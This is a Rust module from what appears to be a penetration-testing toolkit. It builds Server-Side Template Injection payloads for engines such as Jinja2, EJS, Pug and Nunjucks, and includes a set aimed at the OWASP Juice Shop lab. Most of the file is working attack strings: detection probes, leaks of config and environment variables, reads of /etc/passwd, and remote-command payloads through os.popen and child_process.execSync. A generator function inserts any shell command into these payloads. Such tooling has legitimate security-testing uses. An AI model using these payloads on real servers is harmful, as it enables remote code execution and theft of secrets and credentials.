//! Server-Side Template Injection (SSTI) payload generation
//!
//! Provides payloads for various template engines.

/// SSTI payload with description
#[derive(Debug, Clone)]
pub struct SstiPayload {
    pub name: String,
    pub payload: String,
    pub engine: TemplateEngine,
    pub purpose: SstiPurpose,
}

#[derive(Debug, Clone, PartialEq)]
pub enum TemplateEngine {
    Jinja2,
    Twig,
    Freemarker,
    Velocity,
    Smarty,
    Pug,
    Ejs,
    Handlebars,
    Nunjucks,
    Generic,
}

#[derive(Debug, Clone, PartialEq)]
pub enum SstiPurpose {
    Detection,
    InfoLeak,
    Rce,
    FileRead,
}

impl SstiPayload {
    pub fn new(
        name: impl Into<String>,
        payload: impl Into<String>,
        engine: TemplateEngine,
        purpose: SstiPurpose,
    ) -> Self {
        Self {
            name: name.into(),
            payload: payload.into(),
            engine,
            purpose,
        }
    }
}

/// Detection payloads to identify SSTI vulnerability
pub fn detection_payloads() -> Vec<SstiPayload> {
    vec![
        // Mathematical expressions
        SstiPayload::new(
            "Basic math {{7*7}}",
            "{{7*7}}",
            TemplateEngine::Generic,
            SstiPurpose::Detection,
        ),
        SstiPayload::new(
            "Basic math ${7*7}",
            "${7*7}",
            TemplateEngine::Generic,
            SstiPurpose::Detection,
        ),
        SstiPayload::new(
            "Basic math #{7*7}",
            "#{7*7}",
            TemplateEngine::Generic,
            SstiPurpose::Detection,
        ),
        SstiPayload::new(
            "Basic math {{7*'7'}}",
            "{{7*'7'}}",
            TemplateEngine::Jinja2,
            SstiPurpose::Detection,
        ),
        SstiPayload::new(
            "Basic math <%= 7*7 %>",
            "<%= 7*7 %>",
            TemplateEngine::Ejs,
            SstiPurpose::Detection,
        ),
        // String concatenation
        SstiPayload::new(
            "String concat {{'a'+'b'}}",
            "{{'a'+'b'}}",
            TemplateEngine::Generic,
            SstiPurpose::Detection,
        ),
    ]
}

/// Jinja2/Python SSTI payloads
pub fn jinja2_payloads() -> Vec<SstiPayload> {
    vec![
        SstiPayload::new(
            "Config leak",
            "{{config}}",
            TemplateEngine::Jinja2,
            SstiPurpose::InfoLeak,
        ),
        SstiPayload::new(
            "Self reference",
            "{{self}}",
            TemplateEngine::Jinja2,
            SstiPurpose::InfoLeak,
        ),
        SstiPayload::new(
            "Request object",
            "{{request}}",
            TemplateEngine::Jinja2,
            SstiPurpose::InfoLeak,
        ),
        SstiPayload::new(
            "Environment variables",
            "{{config.items()}}",
            TemplateEngine::Jinja2,
            SstiPurpose::InfoLeak,
        ),
        SstiPayload::new(
            "RCE via subprocess",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            TemplateEngine::Jinja2,
            SstiPurpose::Rce,
        ),
        SstiPayload::new(
            "RCE via os",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            TemplateEngine::Jinja2,
            SstiPurpose::Rce,
        ),
        SstiPayload::new(
            "File read",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            TemplateEngine::Jinja2,
            SstiPurpose::FileRead,
        ),
    ]
}

/// Node.js template engine payloads (Pug, EJS, Nunjucks)
pub fn nodejs_payloads() -> Vec<SstiPayload> {
    vec![
        // EJS
        SstiPayload::new(
            "EJS process.env",
            "<%= process.env %>",
            TemplateEngine::Ejs,
            SstiPurpose::InfoLeak,
        ),
        SstiPayload::new(
            "EJS require",
            "<%= require('child_process').execSync('id') %>",
            TemplateEngine::Ejs,
            SstiPurpose::Rce,
        ),
        // Pug
        SstiPayload::new(
            "Pug process.env",
            "#{process.env}",
            TemplateEngine::Pug,
            SstiPurpose::InfoLeak,
        ),
        SstiPayload::new(
            "Pug global",
            "#{global}",
            TemplateEngine::Pug,
            SstiPurpose::InfoLeak,
        ),
        // Nunjucks (used by Juice Shop)
        SstiPayload::new(
            "Nunjucks range",
            "{{range(10)}}",
            TemplateEngine::Nunjucks,
            SstiPurpose::Detection,
        ),
        SstiPayload::new(
            "Nunjucks constructor",
            "{{constructor.constructor('return this')()}}",
            TemplateEngine::Nunjucks,
            SstiPurpose::InfoLeak,
        ),
        SstiPayload::new(
            "Nunjucks process.env",
            "{{constructor.constructor('return process.env')()}}",
            TemplateEngine::Nunjucks,
            SstiPurpose::InfoLeak,
        ),
    ]
}

/// Juice Shop specific SSTI payloads
pub fn juice_shop_ssti() -> Vec<SstiPayload> {
    vec![
        SstiPayload::new(
            "Detection",
            "#{7*7}",
            TemplateEngine::Pug,
            SstiPurpose::Detection,
        ),
        SstiPayload::new(
            "Process.env (SSTI challenge)",
            "#{global.process.env}",
            TemplateEngine::Pug,
            SstiPurpose::InfoLeak,
        ),
        SstiPayload::new(
            "Process.env alternative",
            "#{process.env}",
            TemplateEngine::Pug,
            SstiPurpose::InfoLeak,
        ),
        SstiPayload::new(
            "Process.mainModule",
            "#{global.process.mainModule}",
            TemplateEngine::Pug,
            SstiPurpose::InfoLeak,
        ),
        SstiPayload::new(
            "Require fs",
            "#{global.process.mainModule.require('fs').readdirSync('.')}",
            TemplateEngine::Pug,
            SstiPurpose::FileRead,
        ),
    ]
}

/// Common SSTI test inputs for fuzzing
pub fn ssti_fuzz_payloads() -> Vec<&'static str> {
    vec![
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "${{7*7}}",
        "{{7*'7'}}",
        "{{constructor}}",
        "{{config}}",
        "{{self}}",
        "{{request}}",
        "{{''.__class__}}",
        "#{global}",
        "#{process}",
        "${T(java.lang.Runtime)}",
        "{{=7*7}}",
        "{@7*7}",
        "[[${7*7}]]",
    ]
}

/// Generate SSTI payload with custom command
pub fn generate_rce_payload(engine: TemplateEngine, command: &str) -> Option<String> {
    match engine {
        TemplateEngine::Jinja2 => Some(format!(
            "{{{{config.__class__.__init__.__globals__['os'].popen('{}').read()}}}}",
            command
        )),
        TemplateEngine::Ejs => Some(format!(
            "<%= require('child_process').execSync('{}') %>",
            command
        )),
        TemplateEngine::Pug => Some(format!(
            "#{{global.process.mainModule.require('child_process').execSync('{}')}}",
            command
        )),
        TemplateEngine::Nunjucks => Some(format!(
            "{{{{constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"{}\")')()}}}}",
            command
        )),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detection_payloads() {
        let payloads = detection_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.payload.contains("7*7")));
    }

    #[test]
    fn test_jinja2_payloads() {
        let payloads = jinja2_payloads();
        assert!(payloads.iter().any(|p| p.payload.contains("config")));
    }

    #[test]
    fn test_nodejs_payloads() {
        let payloads = nodejs_payloads();
        assert!(payloads.iter().any(|p| p.payload.contains("process.env")));
    }

    #[test]
    fn test_juice_shop_ssti() {
        let payloads = juice_shop_ssti();
        assert!(payloads
            .iter()
            .any(|p| p.payload.contains("global.process")));
    }

    #[test]
    fn test_generate_rce_payload() {
        let payload = generate_rce_payload(TemplateEngine::Ejs, "id");
        assert!(payload.is_some());
        assert!(payload.unwrap().contains("execSync"));
    }
}
